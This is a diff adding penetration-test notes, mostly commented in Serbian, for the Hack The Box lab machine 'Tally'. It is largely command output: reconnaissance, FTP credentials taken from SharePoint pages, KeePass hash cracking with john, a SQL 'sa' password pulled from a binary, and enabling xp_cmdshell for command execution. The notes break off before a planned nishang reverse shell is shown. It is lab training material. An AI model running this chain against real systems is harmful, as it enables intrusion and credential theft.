@@ -1,0 +1,506 @@
+kangus7@kali:~$ sudo nmap -sC -sV -A -v 10.10.10.59
+PORT     STATE SERVICE       VERSION
+21/tcp   open  ftp           Microsoft ftpd
+| ftp-syst: 
+|_  SYST: Windows_NT
+80/tcp   open  http          Microsoft IIS httpd 10.0
+|_http-favicon: Unknown favicon MD5: 50996DA127314E31E0B14D57B9847C9F
+|_http-generator: Microsoft SharePoint
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+| http-ntlm-info: 
+|   Target_Name: TALLY
+|   NetBIOS_Domain_Name: TALLY
+|   NetBIOS_Computer_Name: TALLY
+|   DNS_Domain_Name: TALLY
+|   DNS_Computer_Name: TALLY
+|_  Product_Version: 10.0.14393
+|_http-server-header: Microsoft-IIS/10.0
+| http-title: Home
+|_Requested resource was 
+
+#default sharepoint page on 10.10.10.59
+http://10.10.10.59/_layouts/15/start.aspx#/default.aspx
+
+81/tcp   open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Bad Request
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp  open  microsoft-ds  Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
+808/tcp  open  ccproxy-http?
+1433/tcp open  ms-sql-s      Microsoft SQL Server 2016 13.00.1601.00; RTM
+| ms-sql-ntlm-info: 
+|   Target_Name: TALLY
+|   NetBIOS_Domain_Name: TALLY
+|   NetBIOS_Computer_Name: TALLY
+|   DNS_Domain_Name: TALLY
+|   DNS_Computer_Name: TALLY
+|_  Product_Version: 10.0.14393
+| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
+| Issuer: commonName=SSL_Self_Signed_Fallback
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha1WithRSAEncryption
+| Not valid before: 2019-07-21T15:34:47
+| Not valid after:  2049-07-21T15:34:47
+| MD5:   5ac4 5b58 4d55 fb60 21fa 6b04 62b7 97a8
+|_SHA-1: dfc2 c7fd 199b ff75 b399 46d6 900c 2425 7784 6ceb
+|_ssl-date: 2019-07-21T16:17:44+00:00; -6m48s from scanner time.
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+
+[...]
+
+Uptime guess: 0.031 days (since Sun Jul 21 17:40:35 2019)
+Network Distance: 2 hops
+TCP Sequence Prediction: Difficulty=259 (Good luck!)
+IP ID Sequence Generation: Incremental
+Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: -6m48s, deviation: 0s, median: -6m49s
+| ms-sql-info: 
+|   10.10.10.59:1433: 
+|     Version: 
+|       name: Microsoft SQL Server 2016 RTM
+|       number: 13.00.1601.00
+|       Product: Microsoft SQL Server 2016
+|       Service pack level: RTM
+|       Post-SP patches applied: false
+|_    TCP port: 1433
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2019-07-21 18:17:45
+|_  start_date: 2019-07-21 17:34:12
+
+TRACEROUTE (using port 80/tcp)
+HOP RTT       ADDRESS
+1   32.94 ms  10.10.14.1
+2   288.83 ms 10.10.10.59
+
+NSE: Script Post-scanning.
+Initiating NSE at 18:24
+Completed NSE at 18:24, 0.00s elapsed
+Initiating NSE at 18:24
+Completed NSE at 18:24, 0.00s elapsed
+Read data files from: /usr/bin/../share/nmap
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 94.78 seconds
+           Raw packets sent: 2144 (98.824KB) | Rcvd: 1269 (54.836KB)
+
+
+https://github.com/danielmiessler/SecLists
+SecLists is the security tester's companion. It's a collection of multiple types of lists used during security assessments, collected in one place. List types include usernames, passwords, URLs, sensitive data patterns, fuzzing payloads, web shells, and many more.
+
+
+#koristimo SecLists za prodjemo kroz sajt sa gobuster-om
+#lista je stravicno dugacka, snimljeno u fajl gobuster.txt
+kangus7@kali:~$ gobuster dir --wordlist /usr/share/wordlists/SecLists/Discovery/Web-Content/CMS/sharepoint.txt --url http://10.10.10.59
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://10.10.10.59
+[+] Threads:        10
+[+] Wordlist:       /usr/share/wordlists/SecLists/Discovery/Web-Content/CMS/sharepoint.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Timeout:        10s
+===============================================================
+2019/07/21 18:43:37 Starting gobuster
+===============================================================
+
+[...]
+
+
+https://blogs.msdn.microsoft.com/how24/2013/05/23/famous-sharepoint-urls-locations/
+Famous SharePoint URLs & Locations
+
+View all site content page (Site content) 
+/_layouts/viewlsts.aspx 					<- ovo nije izlistano u go 
+												buster-u
+
+
+#nakon pristupa http://10.10.10.59/_layouts/15/viewlsts.aspx
+If you click the links the server likes to rewrite the URL and insert in _layouts/15/start.aspx#/. If you remove it then you’ll get to your correct destination.
+
+URL http://10.10.10.59/_layouts/15/start.aspx#/SitePages/Forms/AllPages.aspx
+treba da bude 
+http://10.10.10.59/SitePages/Forms/AllPages.aspx
+
+# SharePointURLBrute
+# https://resources.bishopfox.com/resources/tools/sharepoint-hacking-diggity/attack-tools/
+# SharePointURLBrute is a new SharePoint hacking utility developed to help assessors quickly test user access to 101 common SharePoint administrative pages 
+# mozda bih imao vise srece sa ovim alatom
+
+#two site pages with content
+http://10.10.10.59/SitePages/FinanceTeam.aspx
+
+Migration update
+
+Hi all,
+
+Welcome to your new team page!
+
+As always, there's still a few finishing touches to make.  Rahul - please upload the design mock ups to the Intranet folder as 'index.html' using the 
+ftp_user 								<- username 
+account - I aim to review regularly.
+
+We'll also add the fund and client account pages in due course.
+
+Thanks – Sarah & Tim.
+
+
+http://10.10.10.59/Shared%20Documents/Forms/AllItems.aspx
+
+FTP details
+hostname: tally
+workgroup: htb.local
+password: UTDRSCH53c"$6hys 							<- passwordhydrahydra
+Please create your own user folder upon logging in
+
+
+#pominje Hydra-u za brute force password-a
+#nema mogucnost bruteforce-a username-a
+https://github.com/vanhauser-thc/thc-hydra
+
+
+kangus7@kali:~$ ftp 10.10.10.59
+Connected to 10.10.10.59.
+220 Microsoft FTP Service
+Name (10.10.10.59:kangus7): ftp_user
+331 Password required
+Password:
+230 User logged in.
+Remote system type is Windows_NT.
+ftp> dir
+200 PORT command successful.
+125 Data connection already open; Transfer starting.
+08-31-17  11:51PM       <DIR>          From-Custodian
+10-01-17  11:37PM       <DIR>          Intranet
+08-28-17  06:56PM       <DIR>          Logs
+09-15-17  09:30PM       <DIR>          To-Upload
+09-17-17  09:27PM       <DIR>          User
+226 Transfer complete.
+ftp> 
+
+
+# wget opcija, svucicu citav ftp kod mene
+-m
+--mirror
+    Turn on options suitable for mirroring.  This option turns on recursion and time-stamping, sets
+    infinite recursion depth and keeps FTP directory listings.  It is currently equivalent to -r -N -l
+    inf --no-remove-listing.
+
+kangus7@kali:~/pCloudDrive/OSCP/HTB/Tally/ftp$ wget --mirror 'ftp://ftp_user:UTDRSCH53c"$6hys@10.10.10.59'
+--2019-07-21 19:42:51--  ftp://ftp_user:*password*@10.10.10.59/
+           => ‘10.10.10.59/.listing’
+Connecting to 10.10.10.59:21... connected.
+
+
+#nakon sto je sve prebaceno
+kangus7@kali:~/pCloudDrive/OSCP/HTB/Tally/ftp/10.10.10.59/User$ find . -type f
+./Administrator/New folder/.listing
+./Administrator/.listing
+./Ekta/.listing
+./Ekta/OFSI_quick_guide_flyer.pdf
+./Ekta/PSAIS_1_April_2017.pdf
+./Jess/.listing
+./Jess/actu8-espreadsheet-designer-datasheet.pdf
+./Paul/New folder/.listing
+./Paul/.listing
+./Paul/financial-list-guide.pdf
+./Paul/financial_sanctions_guidance_august_2017.pdf
+./Paul/Monetary_penalties_for_breaches_of_financial_sanctions.pdf
+./Rahul/Mockups-Backup/.listing
+./Rahul/.listing
+./Sarah/.listing
+./Sarah/notes.txt
+./Sarah/MBSASetup-x64-EN.msi
+./Sarah/Windows-KB890830-x64-V5.52.exe
+./Stuart/.listing
+./Stuart/customers - Copy.csv
+./Stuart/Unit4-Connect-Financials-Agenda.pdf
+./Tim/Files/KeePass-2.36/Plugins/.listing 		
+./Tim/Files/KeePass-2.36/XSL/.listing
+./Tim/Files/KeePass-2.36/XSL/KDBX_Common.xsl
+./Tim/Files/KeePass-2.36/XSL/KDBX_DetailsFull_HTML.xsl
+./Tim/Files/KeePass-2.36/XSL/KDBX_DetailsLight_HTML.xsl
+./Tim/Files/KeePass-2.36/XSL/KDBX_PasswordsOnly_TXT.xsl
+./Tim/Files/KeePass-2.36/XSL/KDBX_Tabular_HTML.xsl
+./Tim/Files/KeePass-2.36/.listing
+./Tim/Files/KeePass-2.36/KeePass.exe.config
+./Tim/Files/KeePass-2.36/License.txt
+./Tim/Files/KeePass-2.36/ShInstUtil.exe
+./Tim/Files/KeePass-2.36/KeePass.chm
+./Tim/Files/KeePass-2.36/KeePass.exe
+./Tim/Files/KeePass-2.36/KeePass.XmlSerializers.dll
+./Tim/Files/KeePass-2.36/KeePassLibC32.dll
+./Tim/Files/KeePass-2.36/KeePassLibC64.dll
+./Tim/Files/.listing
+./Tim/Files/bonus.txt
+./Tim/Files/tim.kdbx 						<- Tim ima KeePass bazu
+./Tim/Project/Communications/.listing
+./Tim/Project/Log/.listing
+./Tim/Project/Log/do to.txt
+./Tim/Project/Vendors/.listing
+./Tim/Project/.listing
+./Tim/.listing
+./Yenwi/Archive/.listing
+./Yenwi/.listing
+./.listing
+
+
+kangus7@kali:~/pCloudDrive/OSCP/HTB/Tally/ftp/10.10.10.59/User$ file ./Tim/Files/tim.kdbx 
+./Tim/Files/tim.kdbx: Keepass password database 2.x KDBX
+
+#grabbed the hash of the database
+kangus7@kali:~/pCloudDrive/OSCP/HTB/Tally/ftp/10.10.10.59/User$ keepass2john ./Tim/Files/tim.kdbx > keepass.hash
+
+kangus7@kali:~/pCloudDrive/OSCP/HTB/Tally$ john --wordlist=/usr/share/wordlists/rockyou.txt keepass.hash 
+Using default input encoding: UTF-8
+Loaded 1 password hash (KeePass [SHA256 AES 32/64])
+Cost 1 (iteration count) is 6000 for all loaded hashes
+Cost 2 (version) is 2 for all loaded hashes
+Cost 3 (algorithm [0=AES, 1=TwoFish, 2=ChaCha]) is 0 for all loaded hashes
+Will run 2 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+0g 0:00:00:04 0.02% (ETA: 01:39:02) 0g/s 1006p/s 1006c/s 1006C/s prinsesa..broken1
+
+simplementeyo    (tim) 			<- nas password 
+
+1g 0:00:00:27 DONE (2019-07-21 20:48) 0.03687g/s 910.6p/s 910.6c/s 910.6C/s simplementeyo..sept17
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed
+
+
+#instalirao KeePass
+kangus7@kali:~/pCloudDrive/OSCP/HTB/Tally$ sudo apt install -y keepass2
+kee
+
+Title: TALLY ACCT share
+User name: Finance
+Password: Acc0unting
+
+
+#mount-ujemo share
+
+-t, --types vfstype
+       The argument following the -t is used to indicate the filesystem type.  The filesystem types which
+       are  currently  supported  include:  adfs,  affs,  autofs,  cifs, coda, coherent, cramfs, debugfs,
+       devpts, efs, ext, ext2, ext3, ext4, hfs, hfsplus, hpfs, iso9660, jfs, minix,  msdos,  ncpfs,  nfs,
+       nfs4,  ntfs,  proc,  qnx4,  ramfs, reiserfs, romfs, squashfs, smbfs, sysv, tmpfs, ubifs, udf, ufs,
+       umsdos, usbfs, vfat, xenix, xfs, xiafs.  Note that coherent, sysv and  xenix  are  equivalent  and
+       that  xenix  and  coherent  will  be removed at some point in the future — use sysv instead. Since
+       kernel version 2.1.21 the types ext and xiafs do not exist anymore. Earlier, usbfs  was  known  as
+       usbdevfs.  Note, the real list of all supported filesystems depends on your kernel.
+
+o, --options opts
+       Options are specified with a -o flag followed by a comma separated string of options.
+
+
+#mogao sam da koristim smbclient za povezivanje
+#https://www.itprotoday.com/linux/linuxs-smbclient-command
+kangus7@kali:~/pCloudDrive/OSCP/HTB/Tally$ sudo mount -t cifs //10.10.10.59/ACCT /mnt/tally -o user=Finance
+Password for Finance@//10.10.10.59/ACCT:  **********
+kangus7@kali:~/pCloudDrive/OSCP/HTB/Tally$ ls /mnt/tally/
+Customers  Fees  Invoices  Jess  Payroll  Reports  Tax  Transactions  zz_Archived  zz_Migration
+
+
+#kopiranje ide uzasno sporo
+#du -sh tally, da proverim velicinu fodlera ide sporo
+#prekinuo kopiranje nakon vise od dva sata
+kangus7@kali:/mnt$ cp -r tally ~/pCloudDrive/OSCP/HTB/Tally/share
+
+
+#Looking inside a binary/executable file to grab human-readable strings 
+#ovo ne bi nikada provalio
+#tester.exe je nije COTS, nego njihova aplikacija
+kangus7@kali:/mnt/tally/zz_Migration/binaries/New folder$ strings tester.exe > ~/pCloud/OSCP/HTB/Tallytester.txt
+
+#ovo je string koji se nalazio u okviru tester.exe
+DRIVER={SQL Server};SERVER=TALLY, 1433;DATABASE=orcharddb;
+UID=sa; 							<- user
+PWD=GWE3V65#6KFH93@4GWTG2G; 	 	<- password
+
+# u ovom slucaju imamo admin nalog
+# da se radilo o standardnom korisniku mogao sad da probam
+# https://github.com/NetSPI/PowerUpSQL
+# PowerUpSQL: A PowerShell Toolkit for Attacking SQL Server
+
+
+# pristupamo bazi
+kangus7@kali:/etc$ sqsh -S 10.10.10.59 -U sa -P GWE3V65#6KFH93@4GWTG2G
+sqsh-2.5.16.1 Copyright (C) 1995-2001 Scott C. Gray
+Portions Copyright (C) 2004-2014 Michael Peppler and Martin Wesdorp
+This is free software with ABSOLUTELY NO WARRANTY
+For more information type '\warranty'
+1> 
+
+#nemamo pristupa xp_cmdshell
+1> xp_cmdshell 'whoami'
+2> go
+Msg 15281, Level 16, State 1
+Server 'TALLY', Procedure 'xp_cmdshell', Line 1
+SQL Server blocked access to procedure 'sys.xp_cmdshell' of component 'xp_cmdshell' because this component is turned off as part of the security configuration for this server. A system
+administrator can enable the use of 'xp_cmdshell' by using sp_configure. For more information about enabling 'xp_cmdshell', search for 'xp_cmdshell' in SQL Server Books Online.
+
+#palimo advanced options
+1> exec sp_configure 'show advanced options', 1
+2> reconfigure
+3> go
+Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
+(return status = 0)
+4> reconfigure 					<- mora nakon svake komande da bi se 
+									promena zadrzala
+
+#palimo xp_cmdshell
+1> exec sp_configure 'xp_cmdshell', 1
+2> reconfigure
+3> go
+Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
+(return status = 0)
+4> reconfigure
+
+#startujem u cmd-u komandu whoami
+1> xp_cmdshell 'whoami'
+2> go
+
+        output                                                            
+
+        tally\sarah                                                       
+  		NULL                                                              
+
+(2 rows affected, return status = 0)
+
+
+#listamo da vidimo koje privilegije imamo
+1> xp_cmdshell "whoami /priv"
+2> go
+                                                                                                                                 
+PRIVILEGES INFORMATION
+----------------------
+NULL
+
+Privilege Name                Description                               State
+============================= ========================================= ========
+
+SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled                                                                                                           
+                                                                                                                                                                                                   
+SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled                                                                                                           
+                                                                                                                                                                                                   
+SeChangeNotifyPrivilege       Bypass traverse checking 					Enabled	
+
+#ovo ce nam trebati za priviledge escalation
+# mozemo da koristimo Rotten Potato
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
+
+SeCreateGlobalPrivilege       Create global objects                     Enabled                                                                                                            
+                                                                                                                                                                                                   
+SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled                                                                                                           
+
+NULL 
+
+
+
+# necemo se njakati sa MSSQL-om, otvaramo pravi shell
+# koristimo nishang 
+# https://github.com/samratashok/nishang
+kangus7@kali:/usr/share/nishang/Shells$ ls -1
+Invoke-JSRatRegsvr.ps1
+Invoke-JSRatRundll.ps1
+Invoke-PoshRatHttp.ps1
+Invoke-PoshRatHttps.ps1
+Invoke-PowerShellIcmp.ps1
+Invoke-PowerShellTcpOneLineBind.ps1
+Invoke-PowerShellTcpOneLine.ps1
+Invoke-PowerShellTcp.ps1 				<- koristimo ovu skriptu
+Invoke-PowerShellUdpOneLine.ps1
+Invoke-PowerShellUdp.ps1
+Invoke-PowerShellWmi.ps1
+Invoke-PsGcatAgent.ps1
+Invoke-PsGcat.ps1
+Remove-PoshRat.ps1
+
+
+# Installing PowerShell on Kali Linux cuz why the fuck not
+# https://www.kali.org/tutorials/installing-powershell-on-kali-linux/
+# uputstvo ne radi, naravno
+# nedostaje libicu57 paket
+# moze se skinuti sa https://debian.pkgs.org/9/debian-main-amd64/libicu57_57.1-6+deb9u2_amd64.deb.html
+# kangus7@kali:~/Downloads$ sudo dpkg -i libicu57_57.1-6+deb9u2_amd64.deb 
+
+#imamo powershell
+kangus7@kali:~/Downloads$ pwsh
+PowerShell 6.2.2
+Copyright (c) Microsoft Corporation. All rights reserved.
+
+https://aka.ms/pscore6-docs
+Type 'help' to get help.
+
+PS /home/kangus7/Downloads> update-help
+PS /home/kangus7/Downloads>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
